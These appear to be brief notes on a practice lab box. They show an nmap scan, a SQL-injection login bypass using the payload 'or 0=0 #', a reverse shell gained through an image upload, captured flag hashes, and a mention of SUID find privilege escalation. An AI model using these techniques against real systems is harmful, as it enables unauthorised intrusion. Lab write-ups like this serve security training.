target : 10.150.150.146
└─# nmap -sV -Pn -p- --min-rate 5000 $ip           
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1i PHP/7.4.14 mod_perl/2.0.11 Perl/v5.32.0)
443/tcp  open  ssl/http Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1i PHP/7.4.14 mod_perl/2.0.11 Perl/v5.32.0)
3306/tcp open  mysql?

on the website i found a login
http://10.150.150.146/reviewer/login/index.php and when i enter the '' i got an error

Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test''' at line 1 in /opt/lampp/htdocs/reviewer/login/index.php:11 Stack trace: #0 /opt/lampp/htdocs/reviewer/login/index.php(11): PDOStatement->execute() #1 {main} thrown in /opt/lampp/htdocs/reviewer/login/index.php on line 11

I think it's Sqli, i will bypass the admin Login
I bypass it using 'or 0=0 #
Now have the admin panel http://10.150.150.146/reviewer/system/system/admins/home/index/
FLAG3=e584d01835e057a8fbbd0657d4a01b86f6f540ef
I will try to find a way to get a shell
In the upload image session, we can upload an shell to see 
connect to [10.66.66.50] from (UNKNOWN) [10.150.150.146] 53434
Linux thebit 5.4.0-65-generic #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 00:34:12 up 17 min,  1 user,  load average: 0.00, 0.35, 0.36
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jason    tty1     -                04Feb21 596days  0.10s  0.05s -bash
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 

PrivEsc
daemon@thebit:/home/jason$ cat FLAG1.txt 
ae2c229fbe39cc78a34ab769f784702bfda8c537
using /usr/bin/find SUID i can privilege escalate
d1826ccb3f73690300264b3ff4d2097c4d8bb345